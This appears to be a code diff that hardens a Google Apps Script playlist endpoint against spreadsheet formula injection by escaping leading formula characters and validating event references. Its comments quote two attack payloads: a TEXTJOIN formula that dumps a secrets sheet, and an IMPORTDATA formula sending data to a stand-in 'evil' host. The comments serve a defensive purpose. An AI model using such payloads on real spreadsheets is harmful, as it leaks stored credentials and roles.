@@ -115,6 +115,35 @@ function readPlaylists() {
   return out;
 }
 
+// Sheets evaluates a leading '=', '+' or '-' as a formula and a leading '@' as
+// a range name — and readPlaylists() reads the tab back with
+// getDisplayValues(), which is the EVALUATED text, which action=playlists then
+// hands straight to the caller. Without this, any caller with a valid secret
+// (viewer included — the save path has no role gate, by design) could save a
+// playlist named `=TEXTJOIN(",",1,_groups!A:C)` and read back every group,
+// secret and role in the app, because _playlists lives in the same spreadsheet
+// as _groups. `=IMPORTDATA("https://evil/?x="&_groups!B2)` would exfiltrate it
+// without even reading the row back.
+//
+// A leading apostrophe is the Sheets convention for "this cell is text": the
+// apostrophe is a format marker, not part of the value, so getDisplayValues()
+// omits it again and a playlist honestly named "-5m clips" round-trips
+// unchanged rather than coming back corrupted.
+function sheetSafe(s) {
+  const v = String(s == null ? '' : s);
+  return /^[=+\-@]/.test(v.trim()) ? "'" + v : v;
+}
+
+// The only ref shape the client ever sends is TR.evId's: game#time#type#name,
+// with a numeric time. Anything else is not a legitimate request, so it is
+// refused rather than stored — refs are the one field a caller can fill with
+// arbitrary text and have read back verbatim, and a formula hidden in one of
+// them is the same leak as a formula in the name.
+function validPlaylistRef(r) {
+  const p = String(r).split('#');
+  return p.length >= 4 && p[0] !== '' && /^\d+(?:\.\d+)?$/.test(p[1]);
+}
+
 // The playlist row this secret owns, or null. Ownership is checked here on
 // every write and never trusted from the client, the same way canEditGame
 // guards a game tab.
@@ -548,8 +577,17 @@ function doPost(e) {
       if (refs.length > PLAYLIST_MAX_REFS) {
         return json({ ok: false, error: 'A playlist holds at most ' + PLAYLIST_MAX_REFS + ' events.' });
       }
+      if (!refs.every(validPlaylistRef)) {
+        return json({ ok: false, error: 'A playlist event reference is malformed.' });
+      }
       const note    = String(data.note == null ? '' : data.note).trim();
       const updated = new Date().toISOString();
+      // Sanitised at the point of writing, not at the point of reading, so a
+      // row can never hold a live formula in the first place. The refs are
+      // joined into ONE cell, so it is the joined string that decides whether
+      // the cell is a formula — sanitising each ref separately would leave the
+      // first one deciding for all of them.
+      const cells = { name: sheetSafe(name), note: sheetSafe(note), refs: sheetSafe(refs.join('\n')) };
       if (data.id) {
         // Locked: the row index comes from ownedPlaylist and is used by
         // setValues a few lines later, so both must run under the same lock
@@ -561,13 +599,13 @@ function doPost(e) {
           // client asked to replace something specific.
           if (!owned) return json({ ok: false, error: 'Playlist not found.' });
           sh.getRange(owned.row, 1, 1, PLAYLIST_HEADERS.length)
-            .setValues([[owned.id, owned.owner, name, note, refs.join('\n'), updated]]);
+            .setValues([[owned.id, owned.owner, cells.name, cells.note, cells.refs, updated]]);
           return json({ ok: true, id: owned.id });
         });
       }
       // A brand-new row has no prior index to race on, so it appends unlocked.
       const id = Utilities.getUuid();
-      playlistsSheet().appendRow([id, String(data.secret), name, note, refs.join('\n'), updated]);
+      playlistsSheet().appendRow([id, String(data.secret), cells.name, cells.note, cells.refs, updated]);
       return json({ ok: true, id: id });
     }
 
